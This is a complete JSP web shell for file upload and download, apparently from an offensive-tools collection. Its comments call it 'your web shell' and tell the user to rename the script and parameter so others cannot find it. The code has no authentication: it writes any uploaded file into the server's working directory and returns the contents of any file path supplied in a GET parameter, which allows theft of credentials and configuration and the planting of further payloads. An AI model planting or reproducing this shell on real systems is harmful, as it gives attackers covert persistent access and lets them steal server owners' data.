<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="java.io.File"%>
<%@page import="org.apache.tomcat.util.http.fileupload.FileItem"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletRequestContext"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletFileUpload"%>
<%@page import="org.apache.tomcat.util.http.fileupload.disk.DiskFileItemFactory"%>

<%@page import="java.util.Iterator"%>
<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v3.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>

<%-- modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell --%>
<%-- don't forget to change the script name in the action attribute --%>
<%-- when downloading a file, you should URL encode the file path --%>

<%
    // your parameter/key here
    String parameter = "file";
    String output = "";
    if (request.getMethod() == "POST" && request.getContentType() != null && request.getContentType().startsWith("multipart/form-data")) {
    Iterator files = new ServletFileUpload(new DiskFileItemFactory()).parseRequest(new ServletRequestContext(request)).iterator();
        while (files.hasNext()) {
            FileItem file = (FileItem)files.next();
            if (file.getFieldName().equals(parameter)) {
                try {
                    output = file.getName();
                    int pos = output.lastIndexOf(File.separator);
                    if (pos >= 0) {
                        output = output.substring(pos + 1);
                    }
                    output = System.getProperty("user.dir") + File.separator + output;
                    file.write(new File(output));
                    output = String.format("SUCCESS: File was uploaded to '%s'\n", output);
                } catch (Exception ex) {
                    output = String.format("ERROR: %s\n", ex.getMessage());
                }
            }
            file = null;
        }
        files = null;
    }
    if (request.getMethod() == "GET" && request.getParameter(parameter) != null && request.getParameter(parameter).trim().length() > 0) {
        try {
            output = request.getParameter(parameter).trim();
            response.setHeader("Content-Type", "application/octet-stream");
            response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", Paths.get(output).getFileName()));
            response.getOutputStream().write(Files.readAllBytes(Paths.get(output)));
            response.getOutputStream().flush();
            response.getOutputStream().close();
        } catch (Exception ex) {
            output = String.format("ERROR: %s\n", ex.getMessage());
        }
    }
    // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
    // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>JSP File Upload/Download</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <form method="post" enctype="multipart/form-data" action="./files.jsp">
            <input name="<% out.print(parameter); %>" type="file" required="required">
            <input type="submit" value="Upload">
        </form>
        <pre><% out.print(output); output = null; System.gc(); %></pre>
    </body>
</html>
